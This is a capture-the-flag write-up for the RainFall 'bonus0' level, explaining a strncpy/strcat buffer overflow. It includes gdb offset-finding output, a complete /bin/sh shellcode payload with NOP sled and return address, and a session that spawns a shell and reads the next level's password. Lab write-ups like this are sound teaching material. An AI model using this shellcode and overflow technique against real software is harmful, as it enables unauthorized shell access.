# Ok so we have a bonus0 

bonus0@RainFall:~$ ./bonus0 
 - 
a
 - 
b
a b

# The program is taking 2 user input and then printing it, ok let's see the code
 
 # The "p" function create a buffer of size 4096, read the user input using this buffer, and use strncpy to save 20 char, this is good,
 # Since our buffer is bigger than ou n in strncy, if we put more than 20 char it will create a non null terminated string
  
 # Call the function "p" 2 time (our 2 inputs) and then strcat them together

 # We can also see that the 2 buffers send to p are next to each other 

 # Then it call strcat to concat the two strings together


 # Create a buffer and send it to "pp", then it "puts" the string returned by "pp"
 
 
 # Ok so the plan is simple, if we put more than 20 char in our first input, the first string will be non null terminated !
 # We also saw that the second input is stored next to our first, meaning that in the strcpy the first string and the second one will be "smashed" together
 # So we can fill the buffer with (1st str + 2nd str + " ")
 # Then in the strcat it will try to put the 2nd str in the buffer (witch is already full and will overflow) and we will have 20 - 1 bytes overflow to have 
fun
 # Recap : we need 1st str to be more than 20 char, 2nd str to be exactly 20 char, so 2nd str will be writen out of strcat
 
Finding the offset :

Starting program: /home/user/bonus0/bonus0
 - 
aaaaaaaaaaaaaaaaaaaa
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()

We found the EIP offset to be 9 ! 

We need to put our shellcode after the overflow so we can access it easy ! So we need it between +61 and 4096 ! And use the overflow to point the eip on our shellcode
61 = a(20) + b(20) + 1 + b(20)
We decided to arbitrary put 500 NOP instruction before our shell code so we can find it more easyly
(more than 61 and less than 4096)

payload : 
# first arg : [NOP * 500] + [shellcode]
# second arg : [offset (9)] + [4 bits Address in our nop instructions (+61 to +500)] + [filler to get to 20 bytes (7)]

We need to find the start address of our 4096 buffer so we can point to one of our nop instruction ! 

(gdb) b *0x080484d0  --> We put a breakpoint on the LEA instruction witch allocate our buffer and we print the start address
Breakpoint 1 at 0x80484d0
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe670:	0x00000000   --> our start address is 0xbfffe680

So we pick a random place in our NOP instruction  (+61 to + 500) we took +250 -> 0xbfffe76a

Final payloa : (python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90" * 9 + "\x6a\xe7\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
*payloa want the d*

bonus0@RainFall:~$ (python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90" * 9 + "\x6a\xe7\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
 - 
 - 
�����������������������������z������������� ���������z�������������
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

YEAY IT WORK 

